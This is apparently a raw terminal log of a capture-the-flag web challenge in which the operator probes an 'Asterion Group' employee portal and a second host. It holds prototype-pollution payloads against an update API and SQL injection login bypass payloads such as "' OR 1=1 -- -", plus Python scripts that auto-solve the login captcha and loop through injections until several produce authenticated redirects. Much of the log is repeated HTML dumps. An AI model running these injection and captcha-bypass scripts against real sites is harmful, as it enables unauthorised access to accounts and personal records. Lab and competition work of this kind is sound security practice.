+  -d '{"path": "\u005f\u005fproto\u005f\u005f.isAdmin", "value": true}'
+{"error":"WAF ALERT: Malicious prototype manipulation blocked."}                                                                                                                                                                       
+┌──(white㉿white)-[~/iatcq2026/web]
+└─$ curl -s -b cookies.txt -X POST http://65.1.162.7/api/update \
+  -H "Content-Type: application/json" \
+  -d '{"path": ".__proto__.isAdmin", "value": true}'
+{"error":"WAF ALERT: Malicious prototype manipulation blocked."}                                                                                                                                                                       
+┌──(white㉿white)-[~/iatcq2026/web]
+└─$ curl -s -b cookies.txt http://65.1.162.7/api/flag
+{"flag":"IATCQ{LF6BWCR2VNU0RIFD7CMM5VQBCO}"}                                                                                                                                                                       
+┌──(white㉿white)-[~/iatcq2026/web]
+└─$ curl -v http://13.201.205.33/
+curl -s http://13.201.205.33/ | head -c 3000
+*   Trying 13.201.205.33:80...
+* Established connection to 13.201.205.33 (13.201.205.33 port 80) from 192.168.1.4 port 52136 
+* using HTTP/1.x
+> GET / HTTP/1.1
+> Host: 13.201.205.33
+> User-Agent: curl/8.20.0
+> Accept: */*
+> 
+* Request completely sent off
+< HTTP/1.1 200 OK
+< Server: nginx/1.24.0 (Ubuntu)
+< Date: Wed, 09 Sep 2026 10:18:47 GMT
+< Content-Type: text/html; charset=UTF-8
+< Transfer-Encoding: chunked
+< Connection: keep-alive
+< Set-Cookie: PHPSESSID=sf3lph519jltrddh9t7b2elpdj; path=/; HttpOnly; SameSite=Lax
+< Expires: Thu, 19 Nov 1981 08:52:00 GMT
+< Cache-Control: no-store, no-cache, must-revalidate
+< Pragma: no-cache
+< 
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noindex,nofollow">
+    <title>Asterion Group // Employee Gateway</title>
+    <link rel="icon" href="data:,">
+    <link rel="stylesheet" href="css/bootstrap.min.css">
+    <link rel="stylesheet" href="css/app.css">
+</head>
+<body>
+<div class="noise" aria-hidden="true"></div>
+<nav class="navbar portal-nav" aria-label="Primary navigation">
+    <div class="container">
+        <a class="navbar-brand brand-lockup" href="index.php">
+            <span class="brand-mark">AG</span>
+            <span><strong>ASTERION GROUP</strong><small>employee services</small></span>
+        </a>
+        <div class="d-flex align-items-center gap-3">
+            <a class="nav-event-link d-none d-md-inline-flex" href="#people-event">People &amp; culture</a>
+            <div class="status-pill"><span class="status-dot"></span> GATEWAY ONLINE</div>
+        </div>
+    </div>
+</nav>
+
+<main>
+    <section class="container hero-shell employee-hero">
+        <div class="row align-items-center g-5">
+            <div class="col-lg-7 col-xl-8">
+                <div class="eyebrow">EMPLOYEE OPERATIONS // CORPORATE ACCESS</div>
+                <h1 class="hero-title">One workspace.<br><span>Every working day.</span></h1>
+                <p class="hero-copy">
+                    Access internal services, personnel workflows and operational records through the Asterion employee gateway.
+                </p>
+                <div class="hero-actions d-flex gap-3 flex-wrap mt-4">
+                    <a href="login.php" class="btn btn-danger portal-btn">
+                        EMPLOYEE SIGN IN                    </a>
+                    <a href="#people-event" class="button-secondary">VIEW COMPANY EVENT</a>
+                </div>
+                <div class="service-strip mt-5" aria-label="Service status">
+                    <div><span>IDENTITY</span><strong>AVAILABLE</strong></div>
+                    <div><span>DIRECTORY</span><strong>AVAILABLE</strong></div>
+                    <div><span>ARCHIVE</span><strong>MONITORED</strong></div>
+                </div>
+            </div>
+
+            <div class="col-lg-5 col-xl-4">
+                <section class="intel-card event-preview" aria-labelledby="event-preview-title">
+                    <div class="intel-card-header"><span>UPCOMING EVENT</span><span class="muted-code">06 SEP</span></div>
+                    <div class="event-preview-body">
+                        <span class="event-label">PEOPLE &amp; CULTURE</span>
+                        <h2 id="event-preview-title">Two milestones.<br>One date.</h2>
+                        <p>Celebrating a birthday and a seventh work anniversary together.</p>
+                        <a href="#people-event">Read the announcement <span aria-hidden="true">→</span></a>
+                    </div>
+                </section>
+            </div>
+        </div>
+    </section>
+
+    <section class="event-section" id="people-event" aria-labelledby="event-title">
+        <div class="container">
+            <div class="event-grid">
+                <div class="event-date" aria-label="6 September 2026"><strong>06</strong><span>SEP<br>2026</span></div>
+                <div class="event-story">
+                    <span class="eyebrow">PEOPLE &amp; CULTURE / COMPANY ANNOUNCEMENT</span>
+                    <h2 id="event-title">When your birthday and work anniversary share the same date.</h2>
+                    <p class="event-lead">
+                        This Sunday, we celebrate <strong>Priya Sharma</strong>, Head of People Operations, on her birthday and seven years with Asterion Group.
+                    </p>
+                    <p>
+                        Priya joined the company on 6 September and has helped shape the way our teams grow, connect and work together. Please join us in wishing her a happy birthday and a wonderful seventh work anniversary.
+                    </p>
+                    <div class="event-meta"><span>POSTED 02 SEP 2026</span><span>PEOPLE OPERATIONS</span><span>ALL OFFICES</span></div>
+                </div>
+            </div>
+        </div>
+    </section>
+</main>
+
+<footer class="container portal-footer">
+    <span>ASTERION EMPLOYEE SERVICES</span>
+    <span>INTERNAL ACCESS / 2026</span>
+</footer>
+<script src="js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
+* Connection #0 to host 13.201.205.33:80 left intact
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noindex,nofollow">
+    <title>Asterion Group // Employee Gateway</title>
+    <link rel="icon" href="data:,">
+    <link rel="stylesheet" href="css/bootstrap.min.css">
+    <link rel="stylesheet" href="css/app.css">
+</head>
+<body>
+<div class="noise" aria-hidden="true"></div>
+<nav class="navbar portal-nav" aria-label="Primary navigation">
+    <div class="container">
+        <a class="navbar-brand brand-lockup" href="index.php">
+            <span class="brand-mark">AG</span>
+            <span><strong>ASTERION GROUP</strong><small>employee services</small></span>
+        </a>
+        <div class="d-flex align-items-center gap-3">
+            <a class="nav-event-link d-none d-md-inline-flex" href="#people-event">People &amp; culture</a>
+            <div class="status-pill"><span class="status-dot"></span> GATEWAY ONLINE</div>
+        </div>
+    </div>
+</nav>
+
+<main>
+    <section class="container hero-shell employee-hero">
+        <div class="row align-items-center g-5">
+            <div class="col-lg-7 col-xl-8">
+                <div class="eyebrow">EMPLOYEE OPERATIONS // CORPORATE ACCESS</div>
+                <h1 class="hero-title">One workspace.<br><span>Every working day.</span></h1>
+                <p class="hero-copy">
+                    Access internal services, personnel workflows and operational records through the Asterion employee gateway.
+                </p>
+                <div class="hero-actions d-flex gap-3 flex-wrap mt-4">
+                    <a href="login.php" class="btn btn-danger portal-btn">
+                        EMPLOYEE SIGN IN                    </a>
+                    <a href="#people-event" class="button-secondary">VIEW COMPANY EVENT</a>
+                </div>
+                <div class="service-strip mt-5" aria-label="Service status">
+                    <div><span>IDENTITY</span><strong>AVAILABLE</strong></div>
+                    <div><span>DIRECTORY</span><strong>AVAILABLE</strong></div>
+                    <div><span>ARCHIVE</span><strong>MONITORED</strong></div>
+                </div>
+            </div>
+
+            <div class="col-lg-5 col-xl-4">
+                <section class="intel-card event-preview" aria-labelledby="event-preview-title">
+                    <div class="intel-card-header"><span>UPCOMING EVENT</span><span class="muted-code">06 SEP</span></div>
+                    <div class="event-preview-body">
+                        <span class="event-label">PEOPLE &amp; CULTURE</span>
+                        <h2 id="event-preview-title">Two milestones.<br>One date.</h2>
+                        <p>Celebrating a birthday and a seventh work anniversary together.</p>
+                        <a href="#people-event">Read the announcement <span aria-hidden="true">→</span></a>
+                    </div>
+                </section>
+            </div                                                                                                                                                                       
+┌──(white㉿white)-[~/iatcq2026/web]
+└─$ curl -s http://13.201.205.33/robots.txt
+curl -s http://13.201.205.33/sitemap.xml
+curl -s http://13.201.205.33/.git/config
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noindex,nofollow">
+    <title>Asterion Group // Employee Gateway</title>
+    <link rel="icon" href="data:,">
+    <link rel="stylesheet" href="css/bootstrap.min.css">
+    <link rel="stylesheet" href="css/app.css">
+</head>
+<body>
+<div class="noise" aria-hidden="true"></div>
+<nav class="navbar portal-nav" aria-label="Primary navigation">
+    <div class="container">
+        <a class="navbar-brand brand-lockup" href="index.php">
+            <span class="brand-mark">AG</span>
+            <span><strong>ASTERION GROUP</strong><small>employee services</small></span>
+        </a>
+        <div class="d-flex align-items-center gap-3">
+            <a class="nav-event-link d-none d-md-inline-flex" href="#people-event">People &amp; culture</a>
+            <div class="status-pill"><span class="status-dot"></span> GATEWAY ONLINE</div>
+        </div>
+    </div>
+</nav>
+
+<main>
+    <section class="container hero-shell employee-hero">
+        <div class="row align-items-center g-5">
+            <div class="col-lg-7 col-xl-8">
+                <div class="eyebrow">EMPLOYEE OPERATIONS // CORPORATE ACCESS</div>
+                <h1 class="hero-title">One workspace.<br><span>Every working day.</span></h1>
+                <p class="hero-copy">
+                    Access internal services, personnel workflows and operational records through the Asterion employee gateway.
+                </p>
+                <div class="hero-actions d-flex gap-3 flex-wrap mt-4">
+                    <a href="login.php" class="btn btn-danger portal-btn">
+                        EMPLOYEE SIGN IN                    </a>
+                    <a href="#people-event" class="button-secondary">VIEW COMPANY EVENT</a>
+                </div>
+                <div class="service-strip mt-5" aria-label="Service status">
+                    <div><span>IDENTITY</span><strong>AVAILABLE</strong></div>
+                    <div><span>DIRECTORY</span><strong>AVAILABLE</strong></div>
+                    <div><span>ARCHIVE</span><strong>MONITORED</strong></div>
+                </div>
+            </div>
+
+            <div class="col-lg-5 col-xl-4">
+                <section class="intel-card event-preview" aria-labelledby="event-preview-title">
+                    <div class="intel-card-header"><span>UPCOMING EVENT</span><span class="muted-code">06 SEP</span></div>
+                    <div class="event-preview-body">
+                        <span class="event-label">PEOPLE &amp; CULTURE</span>
+                        <h2 id="event-preview-title">Two milestones.<br>One date.</h2>
+                        <p>Celebrating a birthday and a seventh work anniversary together.</p>
+                        <a href="#people-event">Read the announcement <span aria-hidden="true">→</span></a>
+                    </div>
+                </section>
+            </div>
+        </div>
+    </section>
+
+    <section class="event-section" id="people-event" aria-labelledby="event-title">
+        <div class="container">
+            <div class="event-grid">
+                <div class="event-date" aria-label="6 September 2026"><strong>06</strong><span>SEP<br>2026</span></div>
+                <div class="event-story">
+                    <span class="eyebrow">PEOPLE &amp; CULTURE / COMPANY ANNOUNCEMENT</span>
+                    <h2 id="event-title">When your birthday and work anniversary share the same date.</h2>
+                    <p class="event-lead">
+                        This Sunday, we celebrate <strong>Priya Sharma</strong>, Head of People Operations, on her birthday and seven years with Asterion Group.
+                    </p>
+                    <p>
+                        Priya joined the company on 6 September and has helped shape the way our teams grow, connect and work together. Please join us in wishing her a happy birthday and a wonderful seventh work anniversary.
+                    </p>
+                    <div class="event-meta"><span>POSTED 02 SEP 2026</span><span>PEOPLE OPERATIONS</span><span>ALL OFFICES</span></div>
+                </div>
+            </div>
+        </div>
+    </section>
+</main>
+
+<footer class="container portal-footer">
+    <span>ASTERION EMPLOYEE SERVICES</span>
+    <span>INTERNAL ACCESS / 2026</span>
+</footer>
+<script src="js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noindex,nofollow">
+    <title>Asterion Group // Employee Gateway</title>
+    <link rel="icon" href="data:,">
+    <link rel="stylesheet" href="css/bootstrap.min.css">
+    <link rel="stylesheet" href="css/app.css">
+</head>
+<body>
+<div class="noise" aria-hidden="true"></div>
+<nav class="navbar portal-nav" aria-label="Primary navigation">
+    <div class="container">
+        <a class="navbar-brand brand-lockup" href="index.php">
+            <span class="brand-mark">AG</span>
+            <span><strong>ASTERION GROUP</strong><small>employee services</small></span>
+        </a>
+        <div class="d-flex align-items-center gap-3">
+            <a class="nav-event-link d-none d-md-inline-flex" href="#people-event">People &amp; culture</a>
+            <div class="status-pill"><span class="status-dot"></span> GATEWAY ONLINE</div>
+        </div>
+    </div>
+</nav>
+
+<main>
+    <section class="container hero-shell employee-hero">
+        <div class="row align-items-center g-5">
+            <div class="col-lg-7 col-xl-8">
+                <div class="eyebrow">EMPLOYEE OPERATIONS // CORPORATE ACCESS</div>
+                <h1 class="hero-title">One workspace.<br><span>Every working day.</span></h1>
+                <p class="hero-copy">
+                    Access internal services, personnel workflows and operational records through the Asterion employee gateway.
+                </p>
+                <div class="hero-actions d-flex gap-3 flex-wrap mt-4">
+                    <a href="login.php" class="btn btn-danger portal-btn">
+                        EMPLOYEE SIGN IN                    </a>
+                    <a href="#people-event" class="button-secondary">VIEW COMPANY EVENT</a>
+                </div>
+                <div class="service-strip mt-5" aria-label="Service status">
+                    <div><span>IDENTITY</span><strong>AVAILABLE</strong></div>
+                    <div><span>DIRECTORY</span><strong>AVAILABLE</strong></div>
+                    <div><span>ARCHIVE</span><strong>MONITORED</strong></div>
+                </div>
+            </div>
+
+            <div class="col-lg-5 col-xl-4">
+                <section class="intel-card event-preview" aria-labelledby="event-preview-title">
+                    <div class="intel-card-header"><span>UPCOMING EVENT</span><span class="muted-code">06 SEP</span></div>
+                    <div class="event-preview-body">
+                        <span class="event-label">PEOPLE &amp; CULTURE</span>
+                        <h2 id="event-preview-title">Two milestones.<br>One date.</h2>
+                        <p>Celebrating a birthday and a seventh work anniversary together.</p>
+                        <a href="#people-event">Read the announcement <span aria-hidden="true">→</span></a>
+                    </div>
+                </section>
+            </div>
+        </div>
+    </section>
+
+    <section class="event-section" id="people-event" aria-labelledby="event-title">
+        <div class="container">
+            <div class="event-grid">
+                <div class="event-date" aria-label="6 September 2026"><strong>06</strong><span>SEP<br>2026</span></div>
+                <div class="event-story">
+                    <span class="eyebrow">PEOPLE &amp; CULTURE / COMPANY ANNOUNCEMENT</span>
+                    <h2 id="event-title">When your birthday and work anniversary share the same date.</h2>
+                    <p class="event-lead">
+                        This Sunday, we celebrate <strong>Priya Sharma</strong>, Head of People Operations, on her birthday and seven years with Asterion Group.
+                    </p>
+                    <p>
+                        Priya joined the company on 6 September and has helped shape the way our teams grow, connect and work together. Please join us in wishing her a happy birthday and a wonderful seventh work anniversary.
+                    </p>
+                    <div class="event-meta"><span>POSTED 02 SEP 2026</span><span>PEOPLE OPERATIONS</span><span>ALL OFFICES</span></div>
+                </div>
+            </div>
+        </div>
+    </section>
+</main>
+
+<footer class="container portal-footer">
+    <span>ASTERION EMPLOYEE SERVICES</span>
+    <span>INTERNAL ACCESS / 2026</span>
+</footer>
+<script src="js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
+<html>
+<head><title>403 Forbidden</title></head>
+<body>
+<center><h1>403 Forbidden</h1></center>
+<hr><center>nginx/1.24.0 (Ubuntu)</center>
+</body>
+</html>
+                                                                                                                                                                       
+┌──(white㉿white)-[~/iatcq2026/web]
+└─$ curl -sI http://13.201.205.33/
+HTTP/1.1 200 OK
+Server: nginx/1.24.0 (Ubuntu)
+Date: Wed, 09 Sep 2026 10:20:30 GMT
+Content-Type: text/html; charset=UTF-8
+Connection: keep-alive
+Set-Cookie: PHPSESSID=vd7nfpnhqvofofkk4ceblh6ut0; path=/; HttpOnly; SameSite=Lax
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+
+                                                                                                                                                                       
+┌──(white㉿white)-[~/iatcq2026/web]
+└─$ curl -s http://13.201.205.33/login.php | head -c 3000
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noindex,nofollow">
+    <title>Employee sign in // Asterion Group</title>
+    <link rel="icon" href="data:,">
+    <link rel="stylesheet" href="css/bootstrap.min.css">
+    <link rel="stylesheet" href="css/app.css">
+</head>
+<body class="auth-page">
+<div class="noise" aria-hidden="true"></div>
+<div class="container auth-shell">
+    <a class="back-link" href="index.php">← RETURN TO EMPLOYEE SERVICES</a>
+    <div class="row g-0 auth-panel overflow-hidden">
+        <div class="col-lg-5 auth-side">
+            <div>
+                <span class="eyebrow">CORPORATE IDENTITY GATEWAY</span>
+                <h1>Employee<br>sign in</h1>
+                <p>Authenticate to access your assigned workspace and internal personnel services.</p>
+            </div>
+            <div class="auth-side-meta">
+                <div><span>DIRECTORY</span><strong>PEOPLE/4</strong></div>
+                <div><span>SESSION</span><strong>ENCRYPTED</strong></div>
+                <div><span>AUDIT</span><strong>ENABLED</strong></div>
+            </div>
+        </div>
+        <div class="col-lg-7 auth-form-wrap">
+            <div class="auth-form-inner">
+                <div class="d-flex align-items-center justify-content-between mb-4">
+                    <div><small class="form-kicker">IDENTITY CHECK</small><h2 class="mb-0">Continue to your workspace</h2></div>
+                    <span class="security-icon" aria-hidden="true">◆</span>
+                </div>
+
+                
+                <form method="post" autocomplete="on">
+                    <div class="client-policy" role="note">
+                        <span aria-hidden="true">FILTER</span>
+                        <p>Corporate input policy permits letters, numbers and underscores only.</p>
+                    </div>
+                    <div class="mb-4">
+                        <label for="username" class="form-label">Employee account</label>
+                        <input type="text" class="form-control portal-input" id="username" name="username" placeholder="firstname.lastname" pattern="[A-Za-z0-9_]+" maxlength="32" autocomplete="username" aria-describedby="client-filter-note" data-client-filter required autofocus>
+                    </div>
+                    <div class="mb-4">
+                        <div class="d-flex justify-content-between"><label for="password" class="form-label">Password</label><span class="field-code">ID-GATE/02</span></div>
+                        <input type="password" class="form-control portal-input" id="password" name="password" placeholder="Enter password" pattern="[A-Za-z0-9_]+" maxlength="64" autocomplete="current-password" aria-describedby="client-filter-note" data-client-filter required>
+                        <p class="field-help" id="client-filter-note" aria-live="polite">Special characters are blocked in t                                                                                                                                                                       
+┌──(white㉿white)-[~/iatcq2026/web]
+└─$ for p in archive.php audit.php audit-log.php logs.php log.php directory.php employees.php hr.php people.php case.php personnel.php admin.php dashboard.php; do
+  code=$(curl -s -o /dev/null -w "%{http_code}" http://13.201.205.33/$p)
+  len=$(curl -s http://13.201.205.33/$p | wc -c)
+  echo "$p -> $code ($len bytes)"
+done
+archive.php -> 404 (162 bytes)
+audit.php -> 404 (162 bytes)
+audit-log.php -> 404 (162 bytes)
+logs.php -> 404 (162 bytes)
+log.php -> 404 (162 bytes)
+directory.php -> 404 (162 bytes)
+employees.php -> 404 (162 bytes)
+hr.php -> 404 (162 bytes)
+people.php -> 404 (162 bytes)
+case.php -> 404 (162 bytes)
+personnel.php -> 404 (162 bytes)
+admin.php -> 404 (162 bytes)
+dashboard.php -> 302 (0 bytes)
+                                                                                                                                                                       
+┌──(white㉿white)-[~/iatcq2026/web]
+└─$ curl -s -X POST http://13.201.205.33/login.php \
+  -d "username=test' OR '1'='1&password=test" \
+  -c cookies.txt -v 2>&1 | grep -E "< HTTP|Location"
+< HTTP/1.1 200 OK
+                                                                                                                                                                       
+┌──(white㉿white)-[~/iatcq2026/web]
+└─$ curl -s -X POST http://13.201.205.33/login.php \
+  -d "username=admin' -- -&password=x" \
+  -c cookies.txt -i | head -30
+
+curl -s -X POST http://13.201.205.33/login.php \
+  -d "username=priya.sharma' -- -&password=x" \
+  -c cookies.txt -i | head -30
+HTTP/1.1 200 OK
+Server: nginx/1.24.0 (Ubuntu)
+Date: Wed, 09 Sep 2026 10:23:40 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+Set-Cookie: PHPSESSID=0k66jeopi3uihh7lm0musdh02r; path=/; HttpOnly; SameSite=Lax
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noindex,nofollow">
+    <title>Employee sign in // Asterion Group</title>
+    <link rel="icon" href="data:,">
+    <link rel="stylesheet" href="css/bootstrap.min.css">
+    <link rel="stylesheet" href="css/app.css">
+</head>
+<body class="auth-page">
+<div class="noise" aria-hidden="true"></div>
+<div class="container auth-shell">
+    <a class="back-link" href="index.php">← RETURN TO EMPLOYEE SERVICES</a>
+    <div class="row g-0 auth-panel overflow-hidden">
+        <div class="col-lg-5 auth-side">
+            <div>
+                <span class="eyebrow">CORPORATE IDENTITY GATEWAY</span>
+HTTP/1.1 200 OK
+Server: nginx/1.24.0 (Ubuntu)
+Date: Wed, 09 Sep 2026 10:23:40 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+Set-Cookie: PHPSESSID=sh7lbfeookpk05hqp3fb1bnfi4; path=/; HttpOnly; SameSite=Lax
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noindex,nofollow">
+    <title>Employee sign in // Asterion Group</title>
+    <link rel="icon" href="data:,">
+    <link rel="stylesheet" href="css/bootstrap.min.css">
+    <link rel="stylesheet" href="css/app.css">
+</head>
+<body class="auth-page">
+<div class="noise" aria-hidden="true"></div>
+<div class="container auth-shell">
+    <a class="back-link" href="index.php">← RETURN TO EMPLOYEE SERVICES</a>
+    <div class="row g-0 auth-panel overflow-hidden">
+        <div class="col-lg-5 auth-side">
+            <div>
+                <span class="eyebrow">CORPORATE IDENTITY GATEWAY</span>
+                                                                                                                                                                       
+┌──(white㉿white)-[~/iatcq2026/web]
+└─$ curl -s http://13.201.205.33/login.php | sed -n '/<form/,/<\/form>/p'
+                <form method="post" autocomplete="on">
+                    <div class="client-policy" role="note">
+                        <span aria-hidden="true">FILTER</span>
+                        <p>Corporate input policy permits letters, numbers and underscores only.</p>
+                    </div>
+                    <div class="mb-4">
+                        <label for="username" class="form-label">Employee account</label>
+                        <input type="text" class="form-control portal-input" id="username" name="username" placeholder="firstname.lastname" pattern="[A-Za-z0-9_]+" maxlength="32" autocomplete="username" aria-describedby="client-filter-note" data-client-filter required autofocus>
+                    </div>
+                    <div class="mb-4">
+                        <div class="d-flex justify-content-between"><label for="password" class="form-label">Password</label><span class="field-code">ID-GATE/02</span></div>
+                        <input type="password" class="form-control portal-input" id="password" name="password" placeholder="Enter password" pattern="[A-Za-z0-9_]+" maxlength="64" autocomplete="current-password" aria-describedby="client-filter-note" data-client-filter required>
+                        <p class="field-help" id="client-filter-note" aria-live="polite">Special characters are blocked in this browser.</p>
+                    </div>
+                    <div class="captcha-panel mb-4">
+                        <div class="captcha-challenge" aria-hidden="true">
+                            <span>HUMAN VERIFICATION</span>
+                            <strong>4 + 6 = ?</strong>
+                        </div>
+                        <div class="captcha-answer">
+                            <label for="captcha" class="form-label">Verification answer</label>
+                            <input type="text" class="form-control portal-input" id="captcha" name="captcha" inputmode="numeric" pattern="[0-9]+" maxlength="2" autocomplete="off" aria-describedby="captcha-help" required>
+                        </div>
+                        <p class="field-help captcha-help" id="captcha-help">Enter the result of the calculation before signing in.</p>
+                                            </div>
+                    <button type="submit" class="btn btn-danger portal-btn w-100">SIGN IN</button>
+                </form>
+                                                                                                                                                                       
+┌──(white㉿white)-[~/iatcq2026/web]
+└─$ python3 << 'EOF'
+import requests
+import re
+
+s = requests.Session()
+
+# Fetch login page fresh to get session cookie + current captcha challenge
+r = s.get('http://13.201.205.33/login.php')
+m = re.search(r'(\d+)\s*\+\s*(\d+)\s*=\s*\?', r.text)
+if not m:
+    print("Couldn't find captcha numbers, dumping snippet:")
+    print(r.text[r.text.find('captcha-challenge')-50:r.text.find('captcha-challenge')+200])
+else:
+    a, b = int(m.group(1)), int(m.group(2))
+    answer = a + b
+    print(f"Captcha: {a} + {b} = {answer}")
+
+    payload = {
+        "username": "admin' -- -",
+        "password": "x",
+        "captcha": str(answer)
+    }
+    r2 = s.post('http://13.201.205.33/login.php', data=payload, allow_redirects=False)
+    print("Status:", r2.status_code)
+    print("Location header:", r2.headers.get('Location'))
+    print(r2.text[:500])
+EOF
+Captcha: 8 + 1 = 9
+Status: 200
+Location header: None
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noindex,nofollow">
+    <title>Employee sign in // Asterion Group</title>
+    <link rel="icon" href="data:,">
+    <link rel="stylesheet" href="css/bootstrap.min.css">
+    <link rel="stylesheet" href="css/app.css">
+</head>
+<body class="auth-page">
+<div class="noise" aria-hidden="true"></div>
+<div class="container auth-shell">
+ 
+                                                                                                                                                                       
+┌──(white㉿white)-[~/iatcq2026/web]
+└─$ python3 << 'EOF'
+import requests, re
+
+s = requests.Session()
+r = s.get('http://13.201.205.33/login.php')
+m = re.search(r'(\d+)\s*\+\s*(\d+)\s*=\s*\?', r.text)
+a, b = int(m.group(1)), int(m.group(2))
+
+payload = {"username": "admin' -- -", "password": "x", "captcha": str(a+b)}
+r2 = s.post('http://13.201.205.33/login.php', data=payload, allow_redirects=False)
+
+# Look for any error/alert message in the response
+for pattern in [r'alert[^<]*', r'error[^<]*', r'invalid[^<]*', r'denied[^<]*', r'class="[^"]*(error|alert|danger|warning)[^"]*"[^>]*>([^<]+)']:
+    matches = re.findall(pattern, r2.text, re.IGNORECASE)
+    if matches:
+heredoc> 
+heredoc> 
+heredoc> 
+heredoc> 
+                                                                                                                                                                       
+┌──(white㉿white)-[~/iatcq2026/web]
+└─$ python3 << 'EOF'
+import requests, re
+
+s = requests.Session()
+r = s.get('http://13.201.205.33/login.php')
+m = re.search(r'(\d+)\s*\+\s*(\d+)\s*=\s*\?', r.text)
+a, b = int(m.group(1)), int(m.group(2))
+
+payload = {"username": "admin' -- -", "password": "x", "captcha": str(a+b)}
+r2 = s.post('http://13.201.205.33/login.php', data=payload, allow_redirects=False)
+
+# Look for any error/alert message in the response
+for pattern in [r'alert[^<]*', r'error[^<]*', r'invalid[^<]*', r'denied[^<]*', r'class="[^"]*(error|alert|danger|warning)[^"]*"[^>]*>([^<]+)']:
+    matches = re.findall(pattern, r2.text, re.IGNORECASE)
+    if matches:
+heredoc> 
+                                                                                                                                                                       
+┌──(white㉿white)-[~/iatcq2026/web]
+└─$ python3 << 'EOF'
+import requests, re
+
+s = requests.Session()
+r = s.get('http://13.201.205.33/login.php')
+m = re.search(r'(\d+)\s*\+\s*(\d+)\s*=\s*\?', r.text)
+a, b = int(m.group(1)), int(m.group(2))
+
+payload = {"username": "admin' -- -", "password": "x", "captcha": str(a+b)}
+r2 = s.post('http://13.201.205.33/login.php', data=payload, allow_redirects=False)
+
+# Look for any error/alert message in the response
+for pattern in [r'alert[^<]*', r'error[^<]*', r'invalid[^<]*', r'denied[^<]*', r'class="[^"]*(error|alert|danger|warning)[^"]*"[^>]*>([^<]+)']:
+    matches = re.findall(pattern, r2.text, re.IGNORECASE)
+    if matches:
+        print(pattern, "->", matches[:5])
+
+print("---full body length---", len(r2.text))
+EOF
+alert[^<]* -> ['alert mb-4" role="alert">The employee credentials were not accepted.']
+class="[^"]*(error|alert|danger|warning)[^"]*"[^>]*>([^<]+) -> [('alert', 'The employee credentials were not accepted.'), ('danger', 'SIGN IN')]
+---full body length--- 4480
+                                                                                                                                                                       
+┌──(white㉿white)-[~/iatcq2026/web]
+└─$ python3 << 'EOF'
+import requests, re
+
+payloads = [
+    "admin' -- -",
+    "admin'-- -",
+    "admin'#",
+    "admin' OR '1'='1",
+    "admin' OR '1'='1' -- -",
+    "' OR 1=1 -- -",
+    "' OR '1'='1",
+    "priya.sharma' -- -",
+    "priya.sharma' OR '1'='1' -- -",
+]
+
+for u in payloads:
+    s = requests.Session()
+    r = s.get('http://13.201.205.33/login.php')
+    m = re.search(r'(\d+)\s*\+\s*(\d+)\s*=\s*\?', r.text)
+    a, b = int(m.group(1)), int(m.group(2))
+    data = {"username": u, "password": "x", "captcha": str(a+b)}
+    r2 = s.post('http://13.201.205.33/login.php', data=data, allow_redirects=False)
+    print(f"{u!r:45} -> {r2.status_code} loc={r2.headers.get('Location')}")
+EOF
+"admin' -- -"                                 -> 200 loc=None
+"admin'-- -"                                  -> 200 loc=None
+"admin'#"                                     -> 200 loc=None
+"admin' OR '1'='1"                            -> 200 loc=None
+"admin' OR '1'='1' -- -"                      -> 302 loc=dashboard.php?id=f2c880151e4fc7dec04a3f58c8d56293
+"' OR 1=1 -- -"                               -> 302 loc=dashboard.php?id=f2c880151e4fc7dec04a3f58c8d56293
+"' OR '1'='1"                                 -> 200 loc=None
+"priya.sharma' -- -"                          -> 302 loc=dashboard.php?id=ac662960d5e262cfd3400bf35ce4813b
+"priya.sharma' OR '1'='1' -- -"               -> 302 loc=dashboard.php?id=f2c880151e4fc7dec04a3f58c8d56293
+                                                                                                                                                                       
+┌──(white㉿white)-[~/iatcq2026/web]
+└─$ python3 << 'EOF'
+import requests, re
+
+s = requests.Session()
+r = s.get('http://13.201.205.33/login.php')
+m = re.search(r'(\d+)\s*\+\s*(\d+)\s*=\s*\?', r.text)
+a, b = int(m.group(1)), int(m.group(2))
+
+data = {"username": "priya.sharma' -- -", "password": "x", "captcha": str(a+b)}
+r2 = s.post('http://13.201.205.33/login.php', data=data, allow_redirects=False)
+loc = r2.headers.get('Location')
+print("Redirect to:", loc)
+
+r3 = s.get(f'http://13.201.205.33/{loc}')
+print(r3.text[:5000])
+EOF
+Redirect to: dashboard.php?id=ac662960d5e262cfd3400bf35ce4813b
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noindex,nofollow">
+    <title>Priya Sharma // Asterion</title>
+    <link rel="icon" href="data:,">
+    <link rel="stylesheet" href="css/bootstrap.min.css">
+    <link rel="stylesheet" href="css/app.css">
+</head>
+<body>
